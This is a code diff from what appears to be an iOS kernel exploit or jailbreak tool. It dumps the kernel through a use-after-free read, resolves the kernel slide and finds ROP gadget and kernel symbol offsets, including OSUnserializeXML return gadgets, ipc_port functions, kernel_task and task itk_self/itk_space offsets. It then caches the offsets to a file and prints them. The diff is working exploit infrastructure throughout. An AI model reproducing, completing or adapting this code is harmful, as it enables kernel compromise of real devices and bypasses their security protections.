@@ -3,18 +3,16 @@
 #include <stdint.h>             // uint32_t
 #include <stdio.h>              // FILE, asprintf, fopen, fclose, fscanf
 #include <stdlib.h>             // free
-#include <string.h>             // strncmp, strerror
+#include <string.h>             // memcpy, strncmp, strerror
 #include <sys/sysctl.h>         // CTL_*, KERN_OSVERSION, HW_MODEL, sysctl
 
 #include "common.h"             // DEBUG, addr_t
+#include "find.h"               // find_all_offsets
 #include "slide.h"              // get_kernel_slide
 #include "try.h"                // THROW, TRY, FINALLY
 #include "uaf_read.h"           // uaf_dump_kernel
 
 #include "offsets.h"
-
-// kern.osversion
-// hw.model
 
 #define CACHE_VERSION 1
 offsets_t offsets;
@@ -121,6 +119,7 @@ static uint32_t get_model(void)
     // Static so we can use it in THROW
     static char b[32];
     size_t s = sizeof(b);
+    // sysctl("hw.model")
     int cmd[2] = { CTL_HW, HW_MODEL };
     int ret = sysctl(cmd, sizeof(cmd) / sizeof(*cmd), b, &s, NULL, 0);
     if(ret != 0)
@@ -189,6 +188,7 @@ static uint32_t get_os_version(void)
     // Static so we can use it in THROW
     static char b[32];
     size_t s = sizeof(b);
+    // sysctl("kern.osversion")
     int cmd[2] = { CTL_KERN, KERN_OSVERSION };
     int ret = sysctl(cmd, sizeof(cmd) / sizeof(*cmd), b, &s, NULL, 0);
     if(ret != 0)
@@ -387,7 +387,7 @@ void off_init(const char *dir)
                 ({
                     DEBUG("Yes, trying to load offsets from cache...");
                     addr_t version;
-                    if(fread(&version, sizeof(addr_t), 1, f_off) != sizeof(addr_t))
+                    if(fread(&version, sizeof(version), 1, f_off) != 1)
                     {
                         DEBUG("Failed to read cache file version.");
                     }
@@ -395,7 +395,7 @@ void off_init(const char *dir)
                     {
                         DEBUG("Cache is outdated, discarding.");
                     }
-                    else if(fread(&version, sizeof(offsets), 1, f_off) != sizeof(offsets))
+                    else if(fread(&offsets, sizeof(offsets), 1, f_off) != 1)
                     {
                         DEBUG("Failed to read offsets from cache file.");
                     }
@@ -403,10 +403,10 @@ void off_init(const char *dir)
                     {
                         initialized = true;
                         DEBUG("Successfully loaded offsets from cache, skipping kernel dumping.");
-                        size_t kslide = get_kernel_slide();
 
+                        size_t kslide = get_kernel_slide();
                         addr_t *slid = (addr_t*)&offsets.slid;
-                        for(size_t i = 0; i < sizeof(offsets.slid); ++i)
+                        for(size_t i = 0; i < sizeof(offsets.slid) / sizeof(addr_t); ++i)
                         {
                             slid[i] += kslide;
                         }
@@ -417,6 +417,7 @@ void off_init(const char *dir)
                     fclose(f_off);
                 })
             }
+
             if(!initialized)
             {
                 DEBUG("No offsets loaded so far, dumping the kernel...");
@@ -424,15 +425,73 @@ void off_init(const char *dir)
                 uaf_dump_kernel(&kernel);
                 TRY
                 ({
-                    // TODO
+                    // Save dumped kernel to file
+                    FILE *f_kernel = fopen(kernel_file, "wb");
+                    if(f_kernel == NULL)
+                    {
+                        WARN("Failed to create kernel file (%s)", strerror(errno));
+                    }
+                    else
+                    {
+                        fwrite(kernel.buf, 1, kernel.len, f_kernel);
+                        fclose(f_kernel);
+                        DEBUG("Wrote dumped kernel to %s", kernel_file);
+                    }
+
+                    // Find offsets
+                    find_all_offsets(&kernel, &offsets);
+
+                    // Create an unslid copy
+                    size_t kslide = get_kernel_slide();
+                    offsets_t copy;
+                    memcpy(&copy, &offsets, sizeof(copy));
+                    addr_t *slid = (addr_t*)&copy.slid;
+                    for(size_t i = 0; i < sizeof(copy.slid) / sizeof(addr_t); ++i)
+                    {
+                        slid[i] -= kslide;
+                    }
+
+                    // Write unslid offsets to file
+                    FILE *f_off = fopen(offsets_file, "wb");
+                    if(f_off == NULL)
+                    {
+                        WARN("Failed to create offsets cache file (%s)", strerror(errno));
+                    }
+                    else
+                    {
+                        addr_t version = CACHE_VERSION;
+                        fwrite(&version, sizeof(version), 1, f_off);
+                        fwrite(&copy, sizeof(copy), 1, f_off);
+                        fclose(f_off);
+                        DEBUG("Wrote offsets to %s", offsets_file);
+                    }
                 })
                 FINALLY
                 ({
                     free(kernel.buf);
                 })
             }
-            // TODO: print offsets
 
+            DEBUG("Offsets:");
+            DEBUG("gadget_load_x20_x19                = " ADDR, offsets.slid.gadget_load_x20_x19);
+            DEBUG("gadget_ldp_x9_add_sp_sp_0x10       = " ADDR, offsets.slid.gadget_ldp_x9_add_sp_sp_0x10);
+            DEBUG("gadget_ldr_x0_sp_0x20_load_x22_x19 = " ADDR, offsets.slid.gadget_ldr_x0_sp_0x20_load_x22_x19);
+            DEBUG("gadget_add_x0_x0_x19_load_x20_x19  = " ADDR, offsets.slid.gadget_add_x0_x0_x19_load_x20_x19);
+            DEBUG("gadget_blr_x20_load_x22_x19        = " ADDR, offsets.slid.gadget_blr_x20_load_x22_x19);
+            DEBUG("gadget_str_x0_x19_load_x20_x19     = " ADDR, offsets.slid.gadget_str_x0_x19_load_x20_x19);
+            DEBUG("gadget_ldr_x0_x21_load_x24_19      = " ADDR, offsets.slid.gadget_ldr_x0_x21_load_x24_19);
+            DEBUG("gadget_OSUnserializeXML_return     = " ADDR, offsets.slid.gadget_OSUnserializeXML_return);
+            DEBUG("frag_mov_x1_x20_blr_x19            = " ADDR, offsets.slid.frag_mov_x1_x20_blr_x19);
+            DEBUG("func_ldr_x0_x0                     = " ADDR, offsets.slid.func_ldr_x0_x0);
+            DEBUG("func_current_task                  = " ADDR, offsets.slid.func_current_task);
+            DEBUG("func_ipc_port_copyout_send         = " ADDR, offsets.slid.func_ipc_port_copyout_send);
+            DEBUG("func_ipc_port_make_send            = " ADDR, offsets.slid.func_ipc_port_make_send);
+            DEBUG("data_kernel_task                   = " ADDR, offsets.slid.data_kernel_task);
+            DEBUG("data_realhost_special              = " ADDR, offsets.slid.data_realhost_special);
+            DEBUG("off_task_itk_self                  = " ADDR, offsets.unslid.off_task_itk_self);
+            DEBUG("off_task_itk_space                 = " ADDR, offsets.unslid.off_task_itk_space);
+            DEBUG("OSUnserializeXML_stack             = " ADDR, offsets.unslid.OSUnserializeXML_stack);
+            DEBUG("is_io_service_open_extended_stack  = " ADDR, offsets.unslid.is_io_service_open_extended_stack);
         })
         FINALLY
         ({
